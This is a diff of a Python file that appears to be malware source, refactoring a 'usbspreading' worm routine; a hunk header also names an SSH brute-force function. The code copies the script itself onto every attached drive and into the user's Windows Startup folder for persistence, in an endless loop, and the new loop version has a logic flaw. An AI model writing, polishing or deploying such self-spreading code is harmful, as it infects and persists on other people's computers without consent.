@@ -160,92 +160,20 @@ def bruteforce_ssh(host, wordlist):
         print(connection)
         time.sleep(5)
 
+        
 def usbspreading():
-    a = 1
-    user = user = getpass.getuser()
-    bootfolder = bootfolder = "C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 
-    while a == 1:
+    user = getpass.getuser()
+    bootfolder = "C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
+
+    while True:
         drives = win32api.GetLogicalDriveStrings()
         drives = drives.split('\000')[:-1]
         print(drives)
-
-        if "A:\\" in drives:
-            copy2(__file__, "A:/")
-
-        if "B:\\" in drives:
-            copy2(__file__, "B:/")
-
-        if "C:\\" in drives:
-            copy2(__file__, bootfolder)
-
-        if "D:\\" in drives:
-            copy2(__file__, "D:/")
-
-        if "E:\\" in drives:
-            copy2(__file__, "E:/")
-
-        if "F:\\" in drives:
-            copy2(__file__, "F:/")
-
-        if "G:\\" in drives:
-            copy2(__file__, "G:/")
-
-        if "H:\\" in drives:
-            copy2(__file__, "H:/")
-
-        if "I:\\" in drives:
-            copy2(__file__, "I:/")
-
-        if "J:\\" in drives:
-            copy2(__file__, "J:/")
-
-        if "K:\\" in drives:
-            copy2(__file__, "K:/")
-
-        if "L:\\" in drives:
-            copy2(__file__, ":L/")
-
-        if "M:\\" in drives:
-            copy2(__file__, "M:/")
-
-        if "N:\\" in drives:
-            copy2(__file__, "N:/")
-
-        if "O:\\" in drives:
-            copy2(__file__, "O:/")
-
-        if "P:\\" in drives:
-            copy2(__file__, "P:/")
-
-        if "Q:\\" in drives:
-            copy2(__file__, "Q:/")
-
-        if "R:\\" in drives:
-            copy2(__file__, "R:/")
-
-        if "S:\\" in drives:
-            copy2(__file__, "S:/")
-
-        if "T:\\" in drives:
-            copy2(__file__, "T:/")
-
-        if "U:\\" in drives:
-            copy2(__file__, "U:/")
-
-        if "V:\\" in drives:
-            copy2(__file__, "V:/")
-
-        if "X:\\" in drives:
-            copy2(__file__, "X:/")
-
-        if "Y:\\" in drives:
-            copy2(__file__, "Y:/")
-
-        if "Z:\\" in drives:
-            copy2(__file__, "Z:/")
-
-
+        for drive in drives:
+            if "C:\\" in drives:
+                copy2(__file__, bootfolder)
+            else:
+                copy2(__file__, drive)
         time.sleep(3)
-
-usbspreading()
+        
